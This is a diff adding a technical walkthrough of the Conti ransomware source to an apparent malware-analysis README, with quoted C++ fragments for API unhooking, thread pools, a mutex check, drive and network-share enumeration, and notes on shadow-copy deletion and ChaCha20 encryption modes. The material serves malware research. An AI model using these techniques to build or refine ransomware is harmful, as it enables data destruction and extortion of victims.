@@ -182,6 +182,84 @@ STATIC int my_stoi(char* str) {
 ```
 </details>
 
+#### 5. API Unhooking
+```cpp
+api::InitializeApiModule();
+api::DisableHooks();
+```
+#### 6. Thread Pools
+```cpp
+DWORD dwLocalThreads = g_EncryptMode == LOCAL_ENCRYPT ? SysInfo.dwNumberOfProcessors * 2 : SysInfo.dwNumberOfProcessors;
+DWORD dwNetworkThreads = g_EncryptMode == NETWORK_ENCRYPT ? SysInfo.dwNumberOfProcessors * 2 : SysInfo.dwNumberOfProcessors;
+```
+The ransomware creates separate threadpools for local file encryption and network file encryption, which leads to faster encryption.
+
+#### 7. Mutex
+```cpp
+HANDLE hMutex = pCreateMutexA(NULL, TRUE, OBFA("kjsidugidf99439"));
+if ((DWORD)pWaitForSingleObject(hMutex, 0) != WAIT_OBJECT_0) {
+	return EXIT_FAILURE;
+}
+```
+Creats a mutex with a hardcoded string "kjsidugidf99439" (which gets obfuscated at compile-time) to prevent multiple instances of the ransomware running at the same time. If the mutex exists, the program exits.
+
+#### 8. Shadow Copies
+Deletes Windows Volume Shadow Copies to prevent restoration of encrypted files.
+
+#### 9. Process Whitelist
+```cpp
+process_killer::GetWhiteListProcess(&g_WhitelistPids);
+locker::SetWhiteListProcess(&g_WhitelistPids);
+```
+The ransomware identifies certain processes and saves their PID.
+
+#### 10. Scanning
+Conti starts scanning for files on the system based on g_EncryptMode.
+- File System (enumarates all drvies and starts looking for new files to encrypt)
+```cpp
+if (filesystem::EnumirateDrives(&DriveList)) {
+	hLocalSearch = pCreateThread(NULL, 0, filesystem::StartLocalSearch, &DriveList, 0, NULL);
+}
+```
+- Network (Enumerates remote shares on provided hostnames)
+```
+PSTRING String = NULL;
+TAILQ_FOREACH(String, &g_HostList, Entries) {
+	network_scanner::EnumShares(String->wszString, &ShareList);
+}
+
+network_scanner::PSHARE_INFO ShareInfo = NULL;
+TAILQ_FOREACH(ShareInfo, &ShareList, Entries) {
+	filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
+}
+
+network_scanner::StartScan();
+```
+- Path-Based
+```cpp
+PSTRING Path = NULL;
+TAILQ_FOREACH(Path, &g_PathList, Entries) {
+	filesystem::SearchFiles(Path->wszString, threadpool::LOCAL_THREADPOOL);
+}
+```
+and
+```cpp
+PSTRING Path = NULL;
+TAILQ_FOREACH(Path, &g_PathList, Entries) {
+	filesystem::SearchFiles(Path->wszString, threadpool::NETWORK_THREADPOOL);
+}
+```
+Encrypts specific paths listed in g_PathList.
+
+#### 11. Encryption
+Uses ChaCha20 for file encryption.
+
+Encryption respects the selected mode:
+- local: local drives only
+- net: network shares only
+- all: both local and network
+- backups: targets shadow copies and backup files
+
 # Credits
 - [vxUnderground](https://vx-underground.org/) for [samples, chat logs and much more](https://vx-underground.org/Samples)
 - [SentinelOne](https://www.sentinelone.com/) for [CONTI UNPACKED: UNDERSTANDING RANSOMWARE DEVELOPMENT AS A RESPONSE TO DETECTION – A DETAILED TECHNICAL ANALYSIS](https://assets.sentinelone.com/ransomware-enterprise/conti-ransomware-unpacked)
